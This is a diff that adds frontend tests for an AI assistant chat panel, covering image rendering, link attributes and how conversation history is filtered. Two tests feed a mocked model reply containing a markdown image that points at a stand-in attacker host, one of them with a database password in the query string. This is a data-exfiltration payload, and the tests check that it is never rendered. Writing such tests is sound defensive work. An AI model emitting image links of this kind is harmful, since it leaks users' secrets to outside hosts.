@@ -198,3 +198,79 @@ it('a reply that finishes while the Stop button holds focus hands focus to the t
   expect((stop as HTMLButtonElement).disabled).toBe(true);
   expect(document.activeElement).toBe(screen.getByPlaceholderText(/Ask about traffic/));
 });
+
+function replyWith(text: string) {
+  vi.mocked(streamChatMessage).mockImplementation(async (_m, _h, _c, handlers: StreamHandlers) => {
+    handlers.onText?.(text);
+    handlers.onDone?.({ model: 'm' });
+  });
+}
+
+const at = '2026-09-28T10:00:00.000Z';
+
+it('never loads an image named by the model: it shows the alt text, not an <img>', async () => {
+  replyWith('Summary ![exfil](https://evil.example/p.png?d=payments-db-password) done');
+  const { container } = render(<AIAssistant isOpen onClose={() => {}} namespace="argocd" podNames={[]} />);
+  send(QUESTION);
+  await waitFor(() => expect(screen.getByText(/Summary/)).toBeTruthy());
+  expect(container.querySelector('img')).toBeNull();
+  expect(container.innerHTML).not.toContain('evil.example');
+  expect(screen.getByText(/exfil/)).toBeTruthy();
+});
+
+it('an image with no alt text still says one was left out', async () => {
+  replyWith('Before ![](https://evil.example/p.png) after');
+  const { container } = render(<AIAssistant isOpen onClose={() => {}} namespace="argocd" podNames={[]} />);
+  send(QUESTION);
+  await waitFor(() => expect(screen.getByText('[image]')).toBeTruthy());
+  expect(container.querySelector('img')).toBeNull();
+});
+
+it('opens external links from a reply in a new tab without a referrer or opener', async () => {
+  replyWith('See [the docs](https://kubernetes.io/docs/concepts/services-networking/network-policies/).');
+  render(<AIAssistant isOpen onClose={() => {}} namespace="argocd" podNames={[]} />);
+  send(QUESTION);
+  const link = await screen.findByRole('link', { name: 'the docs' });
+  expect(link.getAttribute('target')).toBe('_blank');
+  expect(link.getAttribute('rel')).toBe('noopener noreferrer');
+});
+
+it('sends only completed exchanges as history: failed, stopped and empty replies are left out', async () => {
+  const turn = (id: string, role: 'user' | 'assistant', content: string) => ({ id, role, content, timestamp: at });
+  sessionStorage.setItem(CONVERSATION_KEY, JSON.stringify([
+    turn('a', 'user', 'q1'),
+    turn('b', 'assistant', 'Error: 503 Service Unavailable'),
+    turn('c', 'user', 'q2'),
+    turn('d', 'assistant', '_Stopped before an answer arrived._'),
+    turn('e', 'user', 'q3'),
+    turn('f', 'assistant', 'a3 partial\n\n_Stopped._'),
+    turn('g', 'user', 'q4'),
+    turn('h', 'assistant', 'a4 partial\n\n_Error: The reply was cut off before it finished_'),
+    turn('i', 'user', 'q5'),
+    turn('j', 'assistant', 'a5'),
+  ]));
+  replyWith('ok');
+  render(<AIAssistant isOpen onClose={() => {}} namespace="argocd" podNames={[]} />);
+  send(QUESTION);
+  await waitFor(() => expect(screen.getByRole('button', { name: 'Send message' })).toBeTruthy());
+  expect(vi.mocked(streamChatMessage).mock.calls[0][1]).toEqual([
+    { role: 'user', content: 'q3' },
+    { role: 'assistant', content: 'a3 partial' },
+    { role: 'user', content: 'q4' },
+    { role: 'assistant', content: 'a4 partial' },
+    { role: 'user', content: 'q5' },
+    { role: 'assistant', content: 'a5' },
+  ]);
+});
+
+it('a reply that finishes empty is not sent back as history', async () => {
+  vi.mocked(streamChatMessage).mockImplementation(async (_m, _h, _c, handlers: StreamHandlers) => {
+    handlers.onDone?.({ model: 'm' });
+  });
+  render(<AIAssistant isOpen onClose={() => {}} namespace="argocd" podNames={[]} />);
+  send('first');
+  await waitFor(() => expect(screen.getByRole('button', { name: 'Send message' })).toBeTruthy());
+  send('second');
+  await waitFor(() => expect(vi.mocked(streamChatMessage).mock.calls).toHaveLength(2));
+  expect(vi.mocked(streamChatMessage).mock.calls[1][1]).toEqual([]);
+});
